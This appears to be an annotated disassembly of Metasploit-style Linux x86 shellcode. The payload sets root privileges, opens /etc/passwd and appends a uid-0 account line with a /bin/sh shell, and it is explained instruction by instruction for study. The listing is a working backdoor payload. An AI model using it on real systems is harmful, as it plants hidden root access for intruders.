
; clear register (initialization)
xor    ecx,ecx             ; set ecx to zero
mov    ebx,ecx             ; set ebx to zero

; call sys setreuid16
push   0x46                ; 0x46 to the top of the stack
pop    eax                 ; put 0x46 in eax (0x46 is the sys_setreuid16 syscall)
int    0x80                ; call sys_setreuid16 setreuid(uid_t ruid, uid_t euid); => setreuid(0, 0)

; call sys_open to open /etc/passwd file and create the file if doesn't exist with flags 0x401
push   0x5                 ; push 0x5 to the top of the stack
pop    eax                 ; put 0x5 in eax
xor    ecx,ecx             ; set ecx to 0
push   ecx                 ; push 0 to the top of the stack
push   0x64777373          ; push 0x64777373 to the top of the stack => sswd
push   0x61702f2f          ; push 0x61702f2f to the top of the stack => //pa
push   0x6374652f          ; push 0x6374652f to the top of the stack => /etc
mov    ebx,esp             ; move "/etc//passwd" in ebx
inc    ecx                 ; increment ecx to 1, ecx become 0x1
mov    ch,0x4              ; mov 4 in ch => ecx is now => 0x401 => hex to int (0x401) => (1025)
int    0x80                ; syscall sys_open from 0x05 => int open(const char *pathname, int flags) open("/etc//passwd", 1025)

; put the return value in ebx (file descriptor)
xchg   ebx,eax             ; exchange value in ebx to eax and eax to ebx
call   0x2073 <code+83>    ;  call 0x56557073 (+83)

 ; string : metasploit:Az/dIsj4p4IRc:0:0::/:/bin/sh to insert in /etc/passwd
ins    DWORD PTR es:[edi],dx
gs je  0x20b0
jae    0x20c1
ins    BYTE PTR es:[edi],dx
outs   dx,DWORD PTR ds:[esi]
imul   esi,DWORD PTR [edx+edi*1+0x41],0x49642f7a
jae    0x20c7
xor    al,0x70
xor    al,0x49
push   edx
arpl   WORD PTR [edx],di
xor    BYTE PTR [edx],bh
xor    BYTE PTR [edx],bh
cmp    ch,BYTE PTR [edi]
cmp    ch,BYTE PTR [edi]
bound  ebp,QWORD PTR [ecx+0x6e]
das
jae    0x20da
or     bl,BYTE PTR [ecx-0x75]
push   ecx                          ; push "metasploit:Az/dIsj4p4IRc:0:0::/:/bin/sh\nY\213Q\374j\004X̀j\001X̀" in the top of the stack
cld

; call   0x2073 <code+83>
pop    ecx                          ; put "metasploit:Az/dIsj4p4IRc:0:0::/:/bin/sh\nY\213Q\374j\004X̀j\001X̀" in ecx
mov    edx,DWORD PTR [ecx-0x4]      ; mov "metasploit:Az/dIsj4p4IRc:0:0::/:/bin/sh" in edx

; write to /etc/passwd
push   0x4                 ; sys_write call ssize_t write(int fd, const void *buf, size_t count);
pop    eax                 ; put /etc//passwd in eax
int    0x80                ; call the syscall

; exit
push   0x1                 ; sys_exit call
pop    eax                 ; sys_exit(1)
int    0x80                ; call the syscall
add    BYTE PTR [eax],al
